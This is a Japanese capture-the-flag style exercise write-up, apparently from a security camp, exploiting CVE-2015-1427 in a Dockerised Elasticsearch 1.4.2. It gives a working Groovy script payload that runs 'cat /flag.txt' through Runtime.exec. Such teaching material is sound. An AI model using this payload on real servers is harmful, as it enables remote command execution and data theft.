# elasticsearch演習
## 概要
CVE-2015-1427を使う問題

最近でも観測されている  
https://www.f5.com/labs/articles/threat-intelligence/vulnerabilities--exploits--and-malware-driving-attack-campaigns-in-december-2019

以下参照  
https://github.com/t0kx/exploit-CVE-2015-1427

## Exploit
local上ではelassticsearchをlocalhostに変更

まずコンテナを起動

```
$ docker build -t cve-2015-1427 .
$ docker run --name es -d -p 9200:9200 cve-2015-1427
```

まず/を叩くとElasticsearchのバージョンが1.4.2であることが分かり、CVE-2015-1427の該当バージョンであることが分かる

```
$ curl http://elasticsearch:9200
{
  "status" : 200,
  "name" : "Harpoon",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search"
}
```

データがないとhitが0件でscriptが実行されないので適当にデータを入れる

```
$ curl -XPUT http://elasticsearch:9200/seccamp/user/yamada -d '{"name" : "Taro Yamada"}'
```

あとはgroovy scriptを実行する

```
$ curl -s http://elasticsearch:9200/_search\?pretty -XPOST -d '{"script_fields": {"myscript": {"script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /flag.txt\").getText()"}}}'
{
  "took" : 4,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 1.0,
    "hits" : [ {
      "_index" : "blog",
      "_type" : "user",
      "_id" : "dilbert",
      "_score" : 1.0,
      "fields" : {
        "myscript" : [ "flag{e14st1cse4rch_cve_2015_1427}\n" ]
      }
    } ]
  }
}
```


